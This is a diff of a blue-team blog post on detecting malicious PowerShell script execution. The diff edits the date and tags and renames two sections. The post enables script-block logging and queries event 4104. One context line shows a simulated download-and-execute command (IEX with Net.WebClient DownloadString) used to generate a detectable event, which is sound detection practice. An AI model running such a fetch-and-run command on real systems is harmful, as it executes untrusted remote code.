@@ -1,8 +1,8 @@
 ---
 title: Detecting Malicious Script Execution in PowerShell
-date: 2024-05-23 07:00:00 -0600
+date: 2024-05-25 06:00:00 -0600
 categories: [blueteam, simulation]
-tags: [hunting, difficulty:low, dev]
+tags: [detection, difficulty:low, prod]
 image:
   path: https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/3d7c8a9b-d0d6-4a44-9078-b62956a3ac16
 ---
@@ -20,7 +20,7 @@ _[@elasticseclabs](https://x.com/elasticseclabs/status/1792932108073132451)_
 ![image](https://www.elastic.co/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Finvisible-miners-unveiling-ghostengine%2Fimage10.png&w=1920&q=100){: .w-75 }
 _Source: Elastic Security Labs **Download and Excecute a PowerShell Script**_
 
-## Detection
+## Collection
 Enabling PowerShell logging is crucial for effective detection of malicious activities. By default, Windows has PowerShell logging disabled, which can hinder our ability to monitor and respond to threats. By configuring detailed logging, we can capture information about every script block, module, and command executed in PowerShell.
 - Open a PowerShell as **Administrator** and run the following commands
 ```powershell
@@ -37,8 +37,8 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 - Output
 ![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/9ae2ba5a-4234-4957-a83f-51cdaf6718c9)
 
-## Hunting
-To hunt for malicious script execution, we will use the following PowerShell command to query the event logs.
+## Result
+To look up for malicious script execution, we will use the following PowerShell command to query the event logs.
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" `
 -FilterXPath '*[System[EventID=4104]]' `
